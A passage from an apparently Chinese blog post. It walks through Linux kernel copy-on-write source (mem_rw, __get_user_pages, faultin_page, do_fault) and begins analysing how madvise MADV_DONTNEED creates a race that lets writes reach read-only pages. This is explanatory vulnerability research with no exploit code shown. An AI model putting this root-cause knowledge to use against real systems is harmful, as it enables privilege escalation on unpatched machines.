class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中首先通过<code>reuse_swap_page</code>判断是否只有一个进程在使用该页，如果是则直接调用<code>wp_page_reuse</code>函数重用该页。如果以上的所有都没满足则进入最后的无法重用进行写时复制。</p><p>那么以上就是COW的全部流程了，接下来分析一下<code>write</code>函数。</p><h3 id="write函数分析"><a href="#write函数分析" class="headerlink" title="write函数分析"></a>write函数分析</h3><p>具体流程其实就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write() =&gt; vfs_write() =&gt; __vfs_write() =&gt; file-&gt;f_op-&gt;write() =&gt; mem_write() =&gt; mem_rw()</span><br></pre></td></tr></table></figure><h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw"></a><strong>mem_rw</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line"><span class="keyword">ssize_t</span> copied;</span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">copied = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line"><span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (!copied)</span><br><span class="line">copied = -EIO;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf += this_len;</span><br><span class="line">addr += this_len;</span><br><span class="line">copied += this_len;</span><br><span class="line">count -= this_len;</span><br><span class="line">&#125;</span><br><span class="line">*ppos = addr;</span><br><span class="line"></span><br><span class="line">mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line"><span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的流程还是听清晰的，首先就是获取一个临时的内存页，紧接着将用户空间的内容放到临时的内存页中即可，接着利用<code>access_remote_vm</code>函数访问内存，然后后面是如果不是写的话就返回内容到用户空间，最后释放临时内存页。</p><h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="access_remote_vm"></a><strong>access_remote_vm</strong></h4><p><code>access_remote_vm</code>函数其实就是<code>__access_remote_vm</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="keyword">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line"><span class="keyword">while</span> (len) &#123;</span><br><span class="line"><span class="keyword">int</span> bytes, ret, offset;</span><br><span class="line"><span class="keyword">void</span> *maddr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment"> * we can access using slightly different code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vma = find_vma(mm, addr);</span><br><span class="line"><span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">  len, write);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">bytes = ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">bytes = len;</span><br><span class="line">offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">maddr = kmap(page);</span><br><span class="line"><span class="keyword">if</span> (write) &#123;</span><br><span class="line">copy_to_user_page(vma, page, addr,</span><br><span class="line">  maddr + offset, buf, bytes);</span><br><span class="line">set_page_dirty_lock(page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">copy_from_user_page(vma, page, addr,</span><br><span class="line">    buf, maddr + offset, bytes);</span><br><span class="line">&#125;</span><br><span class="line">kunmap(page);</span><br><span class="line">page_cache_release(page);</span><br><span class="line">&#125;</span><br><span class="line">len -= bytes;</span><br><span class="line">buf += bytes;</span><br><span class="line">addr += bytes;</span><br><span class="line">&#125;</span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过<code>ret = get_user_pages(tsk, mm, addr, 1, write, 1, &amp;page, &amp;vma);</code>获取到对应目标的内存页。然后通过<code>maddr = kmap(page);</code>建立映射，最后在<code>copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);</code>中写入。</p><p>那么其中最为重要的即为<code>get_user_pages</code>函数</p><h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a><strong>__get_user_pages</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment"> * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment"> * using the address space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> foll_flags = gup_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_increm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line"><span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">vma = find_extend_vma(mm, start);</span><br><span class="line"><span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">gup_flags, &amp;vma,</span><br><span class="line">pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> i ? : ret;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line"><span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">&amp;start, &amp;nr_pages, i,</span><br><span class="line">gup_flags);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment"> * potentially allocating memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line"><span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">cond_resched();</span><br><span class="line">      page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">nonblocking);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"><span class="keyword">case</span> -EFAULT:</span><br><span class="line"><span class="keyword">case</span> -ENOMEM:</span><br><span class="line"><span class="keyword">case</span> -EHWPOISON:</span><br><span class="line"><span class="keyword">return</span> i ? i : ret;</span><br><span class="line"><span class="keyword">case</span> -EBUSY:</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line"><span class="keyword">case</span> -ENOENT:</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line">BUG();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment"> * struct page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line"><span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pages) &#123;</span><br><span class="line">pages[i] = page;</span><br><span class="line">flush_anon_page(vma, page, start);</span><br><span class="line">flush_dcache_page(page);</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">next_page:</span><br><span class="line"><span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">vmas[i] = vma;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line"><span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">page_increm = nr_pages;</span><br><span class="line">i += page_increm;</span><br><span class="line">start += page_increm * PAGE_SIZE;</span><br><span class="line">nr_pages -= page_increm;</span><br><span class="line">&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure><p>最开始就是对vma的一些操作，我们需要注意的是<code>retry</code>之后的内容。可以看出来的是<code>follow_page_mask</code>函数返回的是物理页面，而且<code>faultin_page</code>函数中会调用<code>handle_mm_fault</code>。</p><p>那么我们在第一次往一个文件中写入内容时会因为Linux的延迟绑定机制导致该页还未和对应的物理页建立映射，那么此时<code>follow_page_mask</code>函数返回的则是NULL，随即进入第一个<code>faultin_page</code>函数，根据前面的分析，这一次解决完毕之后，会分配物理页。那么这里经过<code>retry</code>再一次执行<code>follow_page_mask</code>，不过因为页面不可写再一次导致返回的值为NULL，随即进行第二次<code>faultin_page</code>函数，进行写时复制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">(stack_guard_page_start(vma, address) ||</span><br><span class="line"> stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line"><span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">BUG();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tsk) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">*nonblocking = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment"> * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment"> * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment"> * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment"> * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment"> * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次进入时，返回的是一个可写的内存页了，并且返回值为<code>VM_FAULT_WRITE</code>，所以会执行到上面的最后一段，所以会清除掉<code>flag</code>中的<code>FOLL_WRITE</code>。那么在下一次调用<code>follow_page_pte</code>函数时则会返回正常的内存页了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在分析之前，首先看一下<code>madvise</code>系统调用，<code>madvise</code>一共有三个参数，第一个参数为地址，第二参数为范围，第三个参数为行为。而这个函数的作用就是建议内核，在从 addr 指定的地址开始，长度等于 len 参数值的范围内，该区域的用户虚拟内存应遵循特定的使用模式。内核使用这些信息优化与指定范围关联的资源的处理和维护过程。而其中存在一个<code>MADV_DONTNEED</code>参数我所理解的就是去除对应的表项，并且被内核标记，在被需要时可以被重新使用。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次聚焦<code>do_fault</code>函数，可以看到这一次我们的flags其实是没有<code>FAULT_FLAG_WRITE</code>标志位的，所以会直接调用<code>do_read_fault</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 